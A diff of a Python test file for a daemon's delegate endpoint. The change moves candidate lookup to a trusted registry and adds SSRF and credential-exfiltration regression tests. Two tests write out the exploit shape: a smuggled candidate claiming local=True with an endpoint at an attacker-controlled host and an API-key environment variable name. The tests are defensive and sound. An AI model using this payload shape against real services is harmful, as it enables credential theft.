@@ -159,53 +159,119 @@ async def test_scope_with_path_triggers_r13_file_context_fallback_same_as_mcp_to
 
 
 @pytest.mark.asyncio
-async def test_candidates_shape_never_touches_the_daemons_real_config():
-    """A `candidates`-shaped request resolves entirely from the candidates
-    given in the body -- even though the daemon's real `chains_config`/
-    `registry` (passed to `build_delegate_internal_route`) has nothing that
-    would resolve this task, proving the real config is never consulted for
-    this request shape."""
-    real_registry = {
-        "unrelated": DelegateCandidate(name="unrelated", endpoint="http://example.invalid", local=True, model="m")
+async def test_candidates_shape_resolves_names_against_the_trusted_registry():
+    """A `candidates`-shaped request now carries NAME strings, resolved
+    against the daemon's own trusted `registry` (the same one passed to
+    `build_delegate_internal_route()` at construction time) -- even though
+    the daemon's real `chains_config` has no chain that would resolve this
+    task type, proving the task-type resolution path is still bypassed
+    (R39) while the candidate's actual endpoint/model identity now comes
+    from the trusted registry, never the request body."""
+    trusted_registry = {
+        "given": DelegateCandidate(name="given", endpoint="http://example.invalid", local=True, model="m"),
     }
     real_chains_config = ChainsConfig(chains=[], allow_remote=True)  # nothing resolves here
     fake = FakeDelayedClient(result="from-candidate")
-    given_candidate = DelegateCandidate(name="given", endpoint="http://example.invalid", local=True, model="m")
     app, _queue = _app_and_queue(
         chains_config=real_chains_config,
-        registry=real_registry,
+        registry=trusted_registry,
         client_factory=lambda c: fake,
     )
     async with _client(app) as client:
         response = await client.post(
             DELEGATE_INTERNAL_PATH,
-            json={"task": "check", "candidates": [given_candidate.model_dump()]},
+            json={"task": "check", "candidates": ["given"]},
         )
     assert response.status_code == 200
     assert response.json()["result"] == "from-candidate"
 
 
 @pytest.mark.asyncio
-async def test_candidates_shape_defensively_drops_non_local_candidates():
-    """R39's server-side belt-and-suspenders: even if a `candidates` list
-    (which should already be local-only by the time a well-behaved caller
-    builds it) contains a remote candidate, the handler filters it out
-    before ever calling `execute_chain` -- proven by a client that raises if
-    the remote candidate is ever contacted, with only the local one wired
-    to succeed."""
-    local_fake = FakeDelayedClient(result="local-won")
+async def test_candidates_shape_rejects_full_candidate_objects_ssrf_fix():
+    """SECURITY: the OLD request shape (a list of full `DelegateCandidate`
+    objects, including a self-asserted `endpoint`/`api_key_env`/`local`)
+    is no longer accepted at all -- `candidates` is now `list[str]`, so a
+    request trying to smuggle `{"name": "x", "local": True, "endpoint":
+    "http://attacker-controlled-host/collect", "api_key_env":
+    "SOME_ENV_VAR_NAME"}` fails pydantic validation (400 invalid_request)
+    instead of being trusted directly. This is the exact exploit shape the
+    Tier 2 review flagged: without this fix, any local process could name
+    an attacker endpoint, claim `local=True` to bypass R39's intent, and
+    have `api_key_env` resolved and sent to that endpoint."""
+    app, _queue = _app_and_queue()
+    async with _client(app) as client:
+        response = await client.post(
+            DELEGATE_INTERNAL_PATH,
+            json={
+                "task": "check",
+                "candidates": [
+                    {
+                        "name": "x",
+                        "local": True,
+                        "endpoint": "http://attacker-controlled-host/collect",
+                        "api_key_env": "SOME_ENV_VAR_NAME",
+                    }
+                ],
+            },
+        )
+    assert response.status_code == 400
+    assert response.json()["error"] == "invalid_request"
+
+
+@pytest.mark.asyncio
+async def test_candidates_shape_excludes_a_name_that_is_remote_in_the_trusted_registry():
+    """SECURITY (SSRF/credential-exfiltration fix): a `candidates` entry
+    naming a real registry candidate that is actually `local=False` in the
+    daemon's trusted config is excluded -- even though the request body
+    itself never claims `local=True` anywhere (the field doesn't exist in
+    the request shape at all anymore). Proven by wiring the remote
+    candidate's client to raise if ever contacted, and its `endpoint`
+    pointed at what would be an attacker-controlled host with an
+    `api_key_env` naming a secret, to mirror the exact exploit scenario
+    from the review -- none of it can be reached because `local=False` in
+    the trusted registry excludes it regardless of what's requested."""
     exploding = ExplodingClient()
+    local_fake = FakeDelayedClient(result="local-won")
 
     def factory(candidate):
         return exploding if candidate.name == "remote-bad" else local_fake
 
-    app, _queue = _app_and_queue(client_factory=factory)
-    remote = DelegateCandidate(name="remote-bad", endpoint="https://api.example.invalid", local=False, model="m")
-    local = DelegateCandidate(name="local-good", endpoint="http://x", local=True, model="m")
+    trusted_registry = {
+        "remote-bad": DelegateCandidate(
+            name="remote-bad",
+            endpoint="http://attacker-controlled-host/collect",
+            api_key_env="SOME_ENV_VAR_NAME",
+            local=False,
+            model="m",
+        ),
+        "local-good": DelegateCandidate(name="local-good", endpoint="http://x", local=True, model="m"),
+    }
+    app, _queue = _app_and_queue(registry=trusted_registry, client_factory=factory)
     async with _client(app) as client:
         response = await client.post(
             DELEGATE_INTERNAL_PATH,
-            json={"task": "check", "candidates": [remote.model_dump(), local.model_dump()]},
+            json={"task": "check", "candidates": ["remote-bad", "local-good"]},
+        )
+    assert response.status_code == 200
+    assert response.json()["result"] == "local-won"
+
+
+@pytest.mark.asyncio
+async def test_candidates_shape_excludes_an_unknown_name_without_crashing():
+    """A `candidates` entry naming something absent from the trusted
+    registry entirely is excluded gracefully -- mirroring
+    `config/chains.py`'s `_lookup_candidates()` "unresolvable candidate is
+    skipped, not an error" convention -- rather than crashing with a
+    `KeyError` or otherwise raising."""
+    local_fake = FakeDelayedClient(result="local-won")
+    trusted_registry = {
+        "local-good": DelegateCandidate(name="local-good", endpoint="http://x", local=True, model="m"),
+    }
+    app, _queue = _app_and_queue(registry=trusted_registry, client_factory=lambda c: local_fake)
+    async with _client(app) as client:
+        response = await client.post(
+            DELEGATE_INTERNAL_PATH,
+            json={"task": "check", "candidates": ["does-not-exist", "local-good"]},
         )
     assert response.status_code == 200
     assert response.json()["result"] == "local-won"
@@ -310,12 +376,11 @@ async def test_missing_both_task_type_and_candidates_is_a_structured_400():
 
 @pytest.mark.asyncio
 async def test_both_task_type_and_candidates_given_is_a_structured_400():
-    candidate = DelegateCandidate(name="c", endpoint="http://x", local=True, model="m")
     app, _queue = _app_and_queue()
     async with _client(app) as client:
         response = await client.post(
             DELEGATE_INTERNAL_PATH,
-            json={"task": "x", "task_type": TASK_TYPE, "candidates": [candidate.model_dump()]},
+            json={"task": "x", "task_type": TASK_TYPE, "candidates": ["c1"]},
         )
     assert response.status_code == 400
     assert response.json()["error"] == "invalid_request"
@@ -333,16 +398,18 @@ async def test_task_type_and_candidates_requests_are_serialized_through_one_queu
     shared `DelegateQueue`, not two independent instances racing."""
     calls: list[tuple[float, float]] = []
     fake = FakeDelayedClient(delay=0.1, calls=calls)
+    # "c1" is the default registry's own local candidate (see
+    # `_app_and_queue()`) -- reused here as the `candidates`-shape request's
+    # NAME, since candidates are now looked up by name against the trusted
+    # registry rather than carried as full objects in the request body.
     app, _queue = _app_and_queue(client_factory=lambda c: fake)
-
-    local_candidate = DelegateCandidate(name="c2", endpoint="http://x", local=True, model="m")
 
     async with _client(app) as client:
         responses = await asyncio.gather(
             client.post(DELEGATE_INTERNAL_PATH, json={"task_type": TASK_TYPE, "task": "a"}),
             client.post(
                 DELEGATE_INTERNAL_PATH,
-                json={"task": "b", "candidates": [local_candidate.model_dump()]},
+                json={"task": "b", "candidates": ["c1"]},
             ),
         )
 
